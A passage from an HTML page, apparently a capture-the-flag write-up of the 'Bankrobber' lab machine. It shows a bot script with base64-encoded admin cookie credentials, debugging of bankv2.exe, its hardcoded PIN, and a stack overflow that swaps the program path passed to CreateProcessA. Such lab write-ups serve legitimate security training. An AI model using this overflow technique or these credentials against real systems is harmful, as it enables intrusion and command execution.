+        <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span>  <span class="p">:</span> <span class="nx">value</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">domain</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+<span class="nf">newCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">username</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">YWRtaW4%3D</span><span class="dl">'</span><span class="p">);</span>
+<span class="nf">newCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">SG9wZWxlc3Nyb21hbnRpYw%3D%3D</span><span class="dl">'</span><span class="p">);</span>
+<span class="nf">newCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">page</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://localhost/admin/index.php</span><span class="dl">'</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">phantom</span><span class="p">.</span><span class="nf">exit</span><span class="p">();</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>This is similar to the example code on the PhantomJS site for how to load a page. It’s setting the cookies, and then loading the admin page to see the current requests. It is set to run every 4 minutes.</p>
+<p>I guess the reason that I didn’t see a request for my image is that the headless browser isn’t bothering to load images.</p>
+<h3 id="bankv2exe">bankv2.exe</h3>
+<p>I grabbed a copy of <code class="language-plaintext highlighter-rouge">bankv2.exe</code> and opened it in IDA. Looking through <code class="language-plaintext highlighter-rouge">_main</code>, I’ll find bits that I recognize from the program. Here’s the string compare for the pin hardcoded to “0021”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569313829345.webp" type="image/webp"/>
+<img alt="1569313829345" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569313829345.png"/>
+</picture>
+<p>Continuing down, I see some of the messages that are printed, and a call to <code class="language-plaintext highlighter-rouge">_createProc</code>. I’ll switch over to my Windows VM to debug this.</p>
+<p>I double clicked on <code class="language-plaintext highlighter-rouge">bankv2.exe</code> and it opened a terminal window:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569314748558.webp" type="image/webp"/>
+<img alt="1569314748558" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569314748558.png"/>
+</picture>
+<p>Next I opened <code class="language-plaintext highlighter-rouge">x32dbg</code> and attacked to the process. I set a break point at the <code class="language-plaintext highlighter-rouge">recv</code> call that gets the amount:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569314623366.webp" type="image/webp"/>
+<img alt="1569314623366" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569314623366.png"/>
+</picture>
+<p>Then I hit run and it stopped waiting for a connection. I opened a terminal, and connected with <code class="language-plaintext highlighter-rouge">nc</code>. I entered the pin, and then <code class="language-plaintext highlighter-rouge">x32dbg</code> broke just before the call to <code class="language-plaintext highlighter-rouge">recv</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf&gt;</span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span></code></pre></div></div>
+<p>I can see in <code class="language-plaintext highlighter-rouge">x32dbg</code> the stack at this call. It’s going to read my onto the stack.</p>
+<p>The next call is to <code class="language-plaintext highlighter-rouge">mbscpy</code> just below:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569315785368.webp" type="image/webp"/>
+<img alt="1569315785368" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569315785368.png"/>
+</picture>
+<p><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcpy-wcscpy-mbscpy?view=vs-2019">This function</a> is going to copy my input to 0x0061F988:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569315849533.webp" type="image/webp"/>
+<img alt="1569315849533" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569315849533.png"/>
+</picture>
+<p>If I look there in the dump, I see it’s garbage:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569316151992.webp" type="image/webp"/>
+<img alt="1569316151992" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569316151992.png"/>
+</picture>
+<p>But I also see two rows below (32 bytes) the path to <code class="language-plaintext highlighter-rouge">transfer.exe</code>. I’ll keep stepping, seeing my “1000\n” overwrite the first 5 bytes in the dump. Stepping for a while, I’ll get to 0x401f98, where it’s a call to 0x4015c0. The top parameter passed in is 0x61f9a8, which is the address of the string with the path for <code class="language-plaintext highlighter-rouge">transfer.exe</code>.</p>
+<p>Stepping into that function, I’ll see a call to <code class="language-plaintext highlighter-rouge">CreateProcessA</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569316234247.webp" type="image/webp"/>
+<img alt="1569316234247" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569316234247.png"/>
+</picture>
+<p>When I run down to it, I see it is passed the same string, 0x61f9a8:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569316278918.webp" type="image/webp"/>
+<img alt="1569316278918" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569316278918.png"/>
+</picture>
+<p>I’ll set a break point at this call, and continue the program, and give it a bunch of <code class="language-plaintext highlighter-rouge">a</code>s:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf&gt;</span>nc localhost 910
+<span class="go"> --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio &amp; Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+</span><span class="gp"> [$]</span><span class="w"> </span>0021
+<span class="gp"> [$]</span><span class="w"> </span>PIN is correct, access granted!
+<span class="go"> --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+</span><span class="gp"> [$]</span><span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="gp"> [$]</span><span class="w"> </span>Transfering <span class="nv">$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span> using our e-coin transfer application. 
+<span class="gp"> [$]</span><span class="w"> </span>Executing e-coin transfer tool: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+<span class="go">
+</span><span class="gp"> [$]</span><span class="w"> </span>Transaction <span class="k">in </span>progress, you can safely disconnect...
+</code></pre></div></div>
+<p>When I get to process create, I can see it’s going to call the <code class="language-plaintext highlighter-rouge">a</code>s:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1569316385647.webp" type="image/webp"/>
+<img alt="1569316385647" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1569316385647.png"/>
+</picture>
+<p>So this is really just a basic stack overflow. But unlike most stack overflows where I’ll need to get shellcode into memory and then get EIP to point to it, I just need to overwrite a string that’s further down the stack with my own string, and let the program pass that to <code class="language-plaintext highlighter-rouge">CreateProcessA</code>.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/03/07/htb-bankrobber.html"></a>
+</article>
